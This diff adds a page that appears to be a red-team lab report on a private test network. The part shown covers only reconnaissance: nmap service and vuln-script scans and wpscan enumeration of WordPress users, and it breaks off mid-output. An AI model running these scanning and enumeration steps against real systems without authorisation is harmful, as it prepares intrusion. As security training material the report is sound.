@@ -1,0 +1,312 @@
+<h1 id="red-team-summary-of-operations">Red Team: Summary of Operations</h1>
+<h2 id="table-of-contents">Table of Contents</h2>
+<ul>
+<li>Exposed Services</li>
+<li>Critical Vulnerabilities</li>
+<li>Exploitation</li>
+
+</ul>
+<h3 id="exposed-services">Exposed Services</h3>
+<p>Nmap scan results for each machine reveal the below services and OS details:</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true"></a>$ <span class="fu">nmap</span> -sV 192.168.1.*</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true"></a></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true"></a><span class="ex">root@Kali</span>:~# nmap -sV 192.168.1.*</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true"></a><span class="ex">Starting</span> Nmap 7.80 ( https://nmap.org ) <span class="ex">at</span> 2022-03-19 15:43 PDT</span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true"></a><span class="ex">Nmap</span> scan report for 192.168.1.1</span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true"></a><span class="ex">Host</span> is up (0.00075s latency)<span class="ex">.</span></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true"></a><span class="ex">Not</span> shown: 995 filtered ports</span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true"></a><span class="ex">PORT</span>     STATE SERVICE       VERSION</span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true"></a><span class="ex">135/tcp</span>  open  msrpc         Microsoft Windows RPC</span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true"></a><span class="ex">139/tcp</span>  open  netbios-ssn   Microsoft Windows netbios-ssn</span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true"></a><span class="ex">445/tcp</span>  open  microsoft-ds?</span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true"></a><span class="ex">2179/tcp</span> open  vmrdp?</span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true"></a><span class="ex">3389/tcp</span> open  ms-wbt-server Microsoft Terminal Services</span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true"></a><span class="ex">MAC</span> Address: 00:15:5D:00:04:0D (Microsoft)</span>
+<span id="cb1-15"><a href="#cb1-15" aria-hidden="true"></a><span class="ex">Service</span> Info: OS: Windows<span class="kw">;</span> <span class="ex">CPE</span>: cpe:/o:microsoft:windows</span>
+<span id="cb1-16"><a href="#cb1-16" aria-hidden="true"></a></span>
+<span id="cb1-17"><a href="#cb1-17" aria-hidden="true"></a><span class="ex">Nmap</span> scan report for 192.168.1.100</span>
+<span id="cb1-18"><a href="#cb1-18" aria-hidden="true"></a><span class="ex">Host</span> is up (0.0014s latency)<span class="ex">.</span></span>
+<span id="cb1-19"><a href="#cb1-19" aria-hidden="true"></a><span class="ex">Not</span> shown: 998 closed ports</span>
+<span id="cb1-20"><a href="#cb1-20" aria-hidden="true"></a><span class="ex">PORT</span>     STATE SERVICE VERSION</span>
+<span id="cb1-21"><a href="#cb1-21" aria-hidden="true"></a><span class="ex">22/tcp</span>   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux<span class="kw">;</span> <span class="ex">protocol</span> 2.0)</span>
+<span id="cb1-22"><a href="#cb1-22" aria-hidden="true"></a><span class="ex">9200/tcp</span> open  http    Elasticsearch REST API 7.6.1 (name: elk<span class="kw">;</span> <span class="ex">cluster</span>: elasticsearch<span class="kw">;</span> <span class="ex">Lucene</span> 8.4.0)</span>
+<span id="cb1-23"><a href="#cb1-23" aria-hidden="true"></a><span class="ex">MAC</span> Address: 4C:EB:42:D2:D5:D7 (Intel Corporate)</span>
+<span id="cb1-24"><a href="#cb1-24" aria-hidden="true"></a><span class="ex">Service</span> Info: OS: Linux<span class="kw">;</span> <span class="ex">CPE</span>: cpe:/o:linux:linux_kernel</span>
+<span id="cb1-25"><a href="#cb1-25" aria-hidden="true"></a></span>
+<span id="cb1-26"><a href="#cb1-26" aria-hidden="true"></a><span class="ex">Nmap</span> scan report for 192.168.1.105</span>
+<span id="cb1-27"><a href="#cb1-27" aria-hidden="true"></a><span class="ex">Host</span> is up (0.00063s latency)<span class="ex">.</span></span>
+<span id="cb1-28"><a href="#cb1-28" aria-hidden="true"></a><span class="ex">Not</span> shown: 998 closed ports</span>
+<span id="cb1-29"><a href="#cb1-29" aria-hidden="true"></a><span class="ex">PORT</span>   STATE SERVICE VERSION</span>
+<span id="cb1-30"><a href="#cb1-30" aria-hidden="true"></a><span class="ex">22/tcp</span> open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux<span class="kw">;</span> <span class="ex">protocol</span> 2.0)</span>
+<span id="cb1-31"><a href="#cb1-31" aria-hidden="true"></a><span class="ex">80/tcp</span> open  http    Apache httpd 2.4.29</span>
+<span id="cb1-32"><a href="#cb1-32" aria-hidden="true"></a><span class="ex">MAC</span> Address: 00:15:5D:00:04:0F (Microsoft)</span>
+<span id="cb1-33"><a href="#cb1-33" aria-hidden="true"></a><span class="ex">Service</span> Info: Host: 192.168.1.105<span class="kw">;</span> <span class="ex">OS</span>: Linux<span class="kw">;</span> <span class="ex">CPE</span>: cpe:/o:linux:linux_kernel</span>
+<span id="cb1-34"><a href="#cb1-34" aria-hidden="true"></a></span>
+<span id="cb1-35"><a href="#cb1-35" aria-hidden="true"></a><span class="ex">Nmap</span> scan report for 192.168.1.110</span>
+<span id="cb1-36"><a href="#cb1-36" aria-hidden="true"></a><span class="ex">Host</span> is up (0.00078s latency)<span class="ex">.</span></span>
+<span id="cb1-37"><a href="#cb1-37" aria-hidden="true"></a><span class="ex">Not</span> shown: 995 closed ports</span>
+<span id="cb1-38"><a href="#cb1-38" aria-hidden="true"></a><span class="ex">PORT</span>    STATE SERVICE     VERSION</span>
+<span id="cb1-39"><a href="#cb1-39" aria-hidden="true"></a><span class="ex">22/tcp</span>  open  ssh         OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</span>
+<span id="cb1-40"><a href="#cb1-40" aria-hidden="true"></a><span class="ex">80/tcp</span>  open  http        Apache httpd 2.4.10 ((Debian))</span>
+<span id="cb1-41"><a href="#cb1-41" aria-hidden="true"></a><span class="ex">111/tcp</span> open  rpcbind     2-4 (RPC <span class="co">#100000)</span></span>
+<span id="cb1-42"><a href="#cb1-42" aria-hidden="true"></a><span class="ex">139/tcp</span> open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span>
+<span id="cb1-43"><a href="#cb1-43" aria-hidden="true"></a><span class="ex">445/tcp</span> open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span>
+<span id="cb1-44"><a href="#cb1-44" aria-hidden="true"></a><span class="ex">MAC</span> Address: 00:15:5D:00:04:10 (Microsoft)</span>
+<span id="cb1-45"><a href="#cb1-45" aria-hidden="true"></a><span class="ex">Service</span> Info: Host: TARGET1<span class="kw">;</span> <span class="ex">OS</span>: Linux<span class="kw">;</span> <span class="ex">CPE</span>: cpe:/o:linux:linux_kernel</span>
+<span id="cb1-46"><a href="#cb1-46" aria-hidden="true"></a></span>
+<span id="cb1-47"><a href="#cb1-47" aria-hidden="true"></a><span class="ex">Nmap</span> scan report for 192.168.1.115</span>
+<span id="cb1-48"><a href="#cb1-48" aria-hidden="true"></a><span class="ex">Host</span> is up (0.0010s latency)<span class="ex">.</span></span>
+<span id="cb1-49"><a href="#cb1-49" aria-hidden="true"></a><span class="ex">Not</span> shown: 995 closed ports</span>
+<span id="cb1-50"><a href="#cb1-50" aria-hidden="true"></a><span class="ex">PORT</span>    STATE SERVICE     VERSION</span>
+<span id="cb1-51"><a href="#cb1-51" aria-hidden="true"></a><span class="ex">22/tcp</span>  open  ssh         OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</span>
+<span id="cb1-52"><a href="#cb1-52" aria-hidden="true"></a><span class="ex">80/tcp</span>  open  http        Apache httpd 2.4.10 ((Debian))</span>
+<span id="cb1-53"><a href="#cb1-53" aria-hidden="true"></a><span class="ex">111/tcp</span> open  rpcbind     2-4 (RPC <span class="co">#100000)</span></span>
+<span id="cb1-54"><a href="#cb1-54" aria-hidden="true"></a><span class="ex">139/tcp</span> open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span>
+<span id="cb1-55"><a href="#cb1-55" aria-hidden="true"></a><span class="ex">445/tcp</span> open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span>
+<span id="cb1-56"><a href="#cb1-56" aria-hidden="true"></a><span class="ex">MAC</span> Address: 00:15:5D:00:04:11 (Microsoft)</span>
+<span id="cb1-57"><a href="#cb1-57" aria-hidden="true"></a><span class="ex">Service</span> Info: Host: TARGET2<span class="kw">;</span> <span class="ex">OS</span>: Linux<span class="kw">;</span> <span class="ex">CPE</span>: cpe:/o:linux:linux_kernel</span>
+<span id="cb1-58"><a href="#cb1-58" aria-hidden="true"></a></span>
+<span id="cb1-59"><a href="#cb1-59" aria-hidden="true"></a><span class="ex">Nmap</span> scan report for 192.168.1.90</span>
+<span id="cb1-60"><a href="#cb1-60" aria-hidden="true"></a><span class="ex">Host</span> is up (0.000011s latency)<span class="ex">.</span></span>
+<span id="cb1-61"><a href="#cb1-61" aria-hidden="true"></a><span class="ex">Not</span> shown: 999 closed ports</span>
+<span id="cb1-62"><a href="#cb1-62" aria-hidden="true"></a><span class="ex">PORT</span>   STATE SERVICE VERSION</span>
+<span id="cb1-63"><a href="#cb1-63" aria-hidden="true"></a><span class="ex">22/tcp</span> open  ssh     OpenSSH 8.1p1 Debian 5 (protocol 2.0)</span>
+<span id="cb1-64"><a href="#cb1-64" aria-hidden="true"></a><span class="ex">Service</span> Info: OS: Linux<span class="kw">;</span> <span class="ex">CPE</span>: cpe:/o:linux:linux_kernel</span>
+<span id="cb1-65"><a href="#cb1-65" aria-hidden="true"></a></span>
+<span id="cb1-66"><a href="#cb1-66" aria-hidden="true"></a><span class="ex">Service</span> detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span id="cb1-67"><a href="#cb1-67" aria-hidden="true"></a><span class="ex">Nmap</span> done: 256 IP addresses (6 hosts up) <span class="ex">scanned</span> in 27.65 seconds</span>
+<span id="cb1-68"><a href="#cb1-68" aria-hidden="true"></a><span class="ex">root@Kali</span>:~#</span></code></pre></div>
+<p>This scan identifies the services below as potential points of entry:</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true"></a><span class="ex">Nmap</span> scan report for 192.168.1.110</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true"></a><span class="ex">Host</span> is up (0.00078s latency)<span class="ex">.</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true"></a><span class="ex">Not</span> shown: 995 closed ports</span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true"></a><span class="ex">PORT</span>    STATE SERVICE     VERSION</span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true"></a><span class="ex">22/tcp</span>  open  ssh         OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true"></a><span class="ex">80/tcp</span>  open  http        Apache httpd 2.4.10 ((Debian))</span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true"></a><span class="ex">111/tcp</span> open  rpcbind     2-4 (RPC <span class="co">#100000)</span></span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true"></a><span class="ex">139/tcp</span> open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true"></a><span class="ex">445/tcp</span> open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true"></a><span class="ex">MAC</span> Address: 00:15:5D:00:04:10 (Microsoft)</span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true"></a><span class="ex">Service</span> Info: Host: TARGET1<span class="kw">;</span> <span class="ex">OS</span>: Linux<span class="kw">;</span> <span class="ex">CPE</span>: cpe:/o:linux:linux_kernel</span></code></pre></div>
+<ul>
+<li>Target 1
+<ul>
+<li>ssh</li>
+<li>Http</li>
+<li>Samba</li>
+</ul></li>
+</ul>
+<p>The following vulnerabilities were identified on target1:</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true"></a><span class="ex">root@Kali</span>:~# nmap --script vuln 192.168.1.110</span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true"></a><span class="ex">Starting</span> Nmap 7.80 ( https://nmap.org ) <span class="ex">at</span> 2022-03-19 16:02 PDT</span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true"></a><span class="ex">Nmap</span> scan report for 192.168.1.110</span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true"></a><span class="ex">Host</span> is up (0.00092s latency)<span class="ex">.</span></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true"></a><span class="ex">Not</span> shown: 995 closed ports</span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true"></a><span class="ex">PORT</span>    STATE SERVICE</span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true"></a><span class="ex">22/tcp</span>  open  ssh</span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_clamav-exec</span>: ERROR: Script execution failed (use -d to debug)</span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true"></a><span class="ex">80/tcp</span>  open  http</span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_clamav-exec</span>: ERROR: Script execution failed (use -d to debug)</span>
+<span id="cb3-11"><a href="#cb3-11" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">http-csrf</span>:</span>
+<span id="cb3-12"><a href="#cb3-12" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">Spidering</span> limited to: maxdepth=3<span class="kw">;</span> <span class="va">maxpagecount=</span>20; <span class="va">withinhost=</span>192.168.1.110</span>
+<span id="cb3-13"><a href="#cb3-13" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">Found</span> the following possible CSRF vulnerabilities:</span>
+<span id="cb3-14"><a href="#cb3-14" aria-hidden="true"></a><span class="kw">|</span></span>
+<span id="cb3-15"><a href="#cb3-15" aria-hidden="true"></a><span class="kw">|</span>     <span class="ex">Path</span>: http://192.168.1.110:80/</span>
+<span id="cb3-16"><a href="#cb3-16" aria-hidden="true"></a><span class="kw">|</span>     <span class="ex">Form</span> id:</span>
+<span id="cb3-17"><a href="#cb3-17" aria-hidden="true"></a><span class="kw">|</span>     <span class="ex">Form</span> action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a<span class="kw">&amp;</span><span class="va">id=</span>92a4423d01</span>
+<span id="cb3-18"><a href="#cb3-18" aria-hidden="true"></a><span class="kw">|</span></span>
+<span id="cb3-19"><a href="#cb3-19" aria-hidden="true"></a><span class="kw">|</span>     <span class="ex">Path</span>: http://192.168.1.110:80/team.html</span>
+<span id="cb3-20"><a href="#cb3-20" aria-hidden="true"></a><span class="kw">|</span>     <span class="ex">Form</span> id:</span>
+<span id="cb3-21"><a href="#cb3-21" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_</span>    Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a<span class="kw">&amp;</span><span class="va">id=</span>92a4423d01</span>
+<span id="cb3-22"><a href="#cb3-22" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_http-dombased-xss</span>: Could not find any DOM based XSS.</span>
+<span id="cb3-23"><a href="#cb3-23" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">http-enum</span>:</span>
+<span id="cb3-24"><a href="#cb3-24" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">/wordpress</span>/: <span class="ex">Blog</span></span>
+<span id="cb3-25"><a href="#cb3-25" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">/wordpress</span>/wp-login.php: <span class="ex">Wordpress</span> login page.</span>
+<span id="cb3-26"><a href="#cb3-26" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">/css</span>/: <span class="ex">Potentially</span> interesting directory w/ listing on apache/2.4.10 (debian)</span>
+<span id="cb3-27"><a href="#cb3-27" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">/img</span>/: <span class="ex">Potentially</span> interesting directory w/ listing on apache/2.4.10 (debian)</span>
+<span id="cb3-28"><a href="#cb3-28" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">/js</span>/: <span class="ex">Potentially</span> interesting directory w/ listing on apache/2.4.10 (debian)</span>
+<span id="cb3-29"><a href="#cb3-29" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">/manual</span>/: <span class="ex">Potentially</span> interesting folder</span>
+<span id="cb3-30"><a href="#cb3-30" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_</span>  /vendor/: Potentially interesting directory w/ listing on apache/2.4.10 (debian)</span>
+<span id="cb3-31"><a href="#cb3-31" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_http-stored-xss</span>: Could not find any stored XSS vulnerabilities.</span>
+<span id="cb3-32"><a href="#cb3-32" aria-hidden="true"></a><span class="ex">111/tcp</span> open  rpcbind</span>
+<span id="cb3-33"><a href="#cb3-33" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_clamav-exec</span>: ERROR: Script execution failed (use -d to debug)</span>
+<span id="cb3-34"><a href="#cb3-34" aria-hidden="true"></a><span class="ex">139/tcp</span> open  netbios-ssn</span>
+<span id="cb3-35"><a href="#cb3-35" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_clamav-exec</span>: ERROR: Script execution failed (use -d to debug)</span>
+<span id="cb3-36"><a href="#cb3-36" aria-hidden="true"></a><span class="ex">445/tcp</span> open  microsoft-ds</span>
+<span id="cb3-37"><a href="#cb3-37" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_clamav-exec</span>: ERROR: Script execution failed (use -d to debug)</span>
+<span id="cb3-38"><a href="#cb3-38" aria-hidden="true"></a><span class="ex">MAC</span> Address: 00:15:5D:00:04:10 (Microsoft)</span>
+<span id="cb3-39"><a href="#cb3-39" aria-hidden="true"></a></span>
+<span id="cb3-40"><a href="#cb3-40" aria-hidden="true"></a><span class="ex">Host</span> script results:</span>
+<span id="cb3-41"><a href="#cb3-41" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_smb-vuln-ms10-054</span>: false</span>
+<span id="cb3-42"><a href="#cb3-42" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_smb-vuln-ms10-061</span>: false</span>
+<span id="cb3-43"><a href="#cb3-43" aria-hidden="true"></a><span class="kw">|</span> <span class="ex">smb-vuln-regsvc-dos</span>:</span>
+<span id="cb3-44"><a href="#cb3-44" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">VULNERABLE</span>:</span>
+<span id="cb3-45"><a href="#cb3-45" aria-hidden="true"></a><span class="kw">|</span>   <span class="ex">Service</span> regsvc in Microsoft Windows systems vulnerable to denial of service</span>
+<span id="cb3-46"><a href="#cb3-46" aria-hidden="true"></a><span class="kw">|</span>     <span class="ex">State</span>: VULNERABLE</span>
+<span id="cb3-47"><a href="#cb3-47" aria-hidden="true"></a><span class="kw">|</span>       <span class="ex">The</span> service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference</span>
+<span id="cb3-48"><a href="#cb3-48" aria-hidden="true"></a><span class="kw">|</span>       <span class="ex">pointer.</span> This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes</span>
+<span id="cb3-49"><a href="#cb3-49" aria-hidden="true"></a><span class="kw">|</span>       <span class="kw">while</span> <span class="ex">working</span> on smb-enum-sessions.</span>
+<span id="cb3-50"><a href="#cb3-50" aria-hidden="true"></a><span class="kw">|</span><span class="ex">_</span></span></code></pre></div>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true"></a><span class="ex">root@Kali</span>:~# wpscan --url 192.168.1.110/wordpress -e u</span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true"></a><span class="ex">_______________________________________________________________</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true"></a>         <span class="ex">__</span>          _______   _____</span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true"></a>         <span class="ex">\ \ </span>       / /  __ <span class="dt">\ </span>/ ____<span class="kw">|</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true"></a>          <span class="ex">\ \ </span> /\  / /<span class="kw">|</span> <span class="kw">|</span><span class="ex">__</span>) <span class="kw">|</span> <span class="kw">(</span><span class="ex">___</span>   ___  __ _ _ __ ®</span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true"></a>           <span class="ex">\ </span>\/  \/ / <span class="kw">|</span>  <span class="ex">___/</span> \___ <span class="dt">\ </span>/ __<span class="kw">|</span><span class="ex">/</span> _  <span class="kw">|</span>  <span class="ex">_</span> <span class="kw">\</span></span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true"></a>            <span class="ex">\ </span> /\  /  <span class="kw">|</span> <span class="kw">|</span>     <span class="ex">____</span><span class="kw">)</span> <span class="kw">|</span> <span class="kw">(</span><span class="ex">__</span><span class="kw">|</span> <span class="kw">(</span><span class="ex">_</span><span class="kw">|</span> <span class="kw">|</span> <span class="kw">|</span> <span class="kw">|</span> <span class="kw">|</span></span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true"></a>             \<span class="ex">/</span>  \/   <span class="kw">|</span><span class="ex">_</span><span class="kw">|</span>    <span class="kw">|</span><span class="ex">_____/</span> \___<span class="kw">|</span>\<span class="ex">__</span>,_<span class="kw">|</span><span class="ex">_</span><span class="kw">|</span> <span class="kw">|</span><span class="ex">_</span><span class="kw">|</span></span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true"></a></span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true"></a>         <span class="ex">WordPress</span> Security Scanner by the WPScan Team</span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true"></a>                         <span class="ex">Version</span> 3.7.8</span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true"></a>       <span class="ex">Sponsored</span> by Automattic - https://automattic.com/</span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true"></a>       <span class="ex">@_WPScan_</span>, @ethicalhack3r, @erwan_lr, @firefart</span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true"></a><span class="ex">_______________________________________________________________</span></span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true"></a></span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true"></a>[<span class="ex">+</span>] URL: http://192.168.1.110/wordpress/</span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true"></a>[<span class="ex">+</span>] Started: Sat Mar 19 16:11:19 2022</span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true"></a></span>
+<span id="cb4-19"><a href="#cb4-19" aria-hidden="true"></a><span class="ex">Interesting</span> Finding(s<span class="kw">)</span><span class="bu">:</span></span>
+<span id="cb4-20"><a href="#cb4-20" aria-hidden="true"></a></span>
+<span id="cb4-21"><a href="#cb4-21" aria-hidden="true"></a>[<span class="ex">+</span>] http://192.168.1.110/wordpress/</span>
+<span id="cb4-22"><a href="#cb4-22" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Interesting</span> Entry: Server: Apache/2.4.10 (Debian<span class="kw">)</span></span>
+<span id="cb4-23"><a href="#cb4-23" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Found</span> By: Headers (Passive Detection)</span>
+<span id="cb4-24"><a href="#cb4-24" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Confidence</span>: 100%</span>
+<span id="cb4-25"><a href="#cb4-25" aria-hidden="true"></a></span>
+<span id="cb4-26"><a href="#cb4-26" aria-hidden="true"></a>[<span class="ex">+</span>] http://192.168.1.110/wordpress/xmlrpc.php</span>
+<span id="cb4-27"><a href="#cb4-27" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Found</span> By: Direct Access (Aggressive Detection)</span>
+<span id="cb4-28"><a href="#cb4-28" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Confidence</span>: 100%</span>
+<span id="cb4-29"><a href="#cb4-29" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">References</span>:</span>
+<span id="cb4-30"><a href="#cb4-30" aria-hidden="true"></a> <span class="kw">|</span>  <span class="ex">-</span> http://codex.wordpress.org/XML-RPC_Pingback_API</span>
+<span id="cb4-31"><a href="#cb4-31" aria-hidden="true"></a> <span class="kw">|</span>  <span class="ex">-</span> https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span>
+<span id="cb4-32"><a href="#cb4-32" aria-hidden="true"></a> <span class="kw">|</span>  <span class="ex">-</span> https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span>
+<span id="cb4-33"><a href="#cb4-33" aria-hidden="true"></a> <span class="kw">|</span>  <span class="ex">-</span> https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span>
+<span id="cb4-34"><a href="#cb4-34" aria-hidden="true"></a> <span class="kw">|</span>  <span class="ex">-</span> https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span>
+<span id="cb4-35"><a href="#cb4-35" aria-hidden="true"></a></span>
+<span id="cb4-36"><a href="#cb4-36" aria-hidden="true"></a>[<span class="ex">+</span>] http://192.168.1.110/wordpress/readme.html</span>
+<span id="cb4-37"><a href="#cb4-37" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Found</span> By: Direct Access (Aggressive Detection)</span>
+<span id="cb4-38"><a href="#cb4-38" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Confidence</span>: 100%</span>
+<span id="cb4-39"><a href="#cb4-39" aria-hidden="true"></a></span>
+<span id="cb4-40"><a href="#cb4-40" aria-hidden="true"></a>[<span class="ex">+</span>] http://192.168.1.110/wordpress/wp-cron.php</span>
+<span id="cb4-41"><a href="#cb4-41" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Found</span> By: Direct Access (Aggressive Detection)</span>
+<span id="cb4-42"><a href="#cb4-42" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Confidence</span>: 60%</span>
+<span id="cb4-43"><a href="#cb4-43" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">References</span>:</span>
+<span id="cb4-44"><a href="#cb4-44" aria-hidden="true"></a> <span class="kw">|</span>  <span class="ex">-</span> https://www.iplocation.net/defend-wordpress-from-ddos</span>
+<span id="cb4-45"><a href="#cb4-45" aria-hidden="true"></a> <span class="kw">|</span>  <span class="ex">-</span> https://github.com/wpscanteam/wpscan/issues/1299</span>
+<span id="cb4-46"><a href="#cb4-46" aria-hidden="true"></a></span>
+<span id="cb4-47"><a href="#cb4-47" aria-hidden="true"></a>[<span class="ex">+</span>] WordPress version 4.8.19 identified (Latest, released on 2022-03-11)<span class="ex">.</span></span>
+<span id="cb4-48"><a href="#cb4-48" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Found</span> By: Emoji Settings (Passive Detection)</span>
+<span id="cb4-49"><a href="#cb4-49" aria-hidden="true"></a> <span class="kw">|</span>  <span class="ex">-</span> http://192.168.1.110/wordpress/, Match: <span class="st">&quot;-release.min.js?ver=4.8.19&quot;</span></span>
+<span id="cb4-50"><a href="#cb4-50" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Confirmed</span> By: Meta Generator (Passive Detection)</span>
+<span id="cb4-51"><a href="#cb4-51" aria-hidden="true"></a> <span class="kw">|</span>  <span class="ex">-</span> http://192.168.1.110/wordpress/, Match: <span class="st">&quot;WordPress 4.8.19&quot;</span></span>
+<span id="cb4-52"><a href="#cb4-52" aria-hidden="true"></a></span>
+<span id="cb4-53"><a href="#cb4-53" aria-hidden="true"></a>[<span class="ex">i</span>] The main theme could not be detected.</span>
+<span id="cb4-54"><a href="#cb4-54" aria-hidden="true"></a></span>
+<span id="cb4-55"><a href="#cb4-55" aria-hidden="true"></a>[<span class="ex">+</span>] Enumerating Users (via Passive and Aggressive Methods)</span>
+<span id="cb4-56"><a href="#cb4-56" aria-hidden="true"></a> <span class="ex">Brute</span> Forcing Author IDs - Time: 00:00:00 <span class="op">&lt;</span>==========================================<span class="op">&gt;</span> (10 / 10) <span class="ex">100.00%</span> Time: 00:00:00</span>
+<span id="cb4-57"><a href="#cb4-57" aria-hidden="true"></a></span>
+<span id="cb4-58"><a href="#cb4-58" aria-hidden="true"></a>[<span class="ex">i</span>] User(s) <span class="ex">Identified</span>:</span>
+<span id="cb4-59"><a href="#cb4-59" aria-hidden="true"></a></span>
+<span id="cb4-60"><a href="#cb4-60" aria-hidden="true"></a>[<span class="ex">+</span>] steven</span>
+<span id="cb4-61"><a href="#cb4-61" aria-hidden="true"></a> <span class="kw">|</span> <span class="ex">Found</span> By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span>
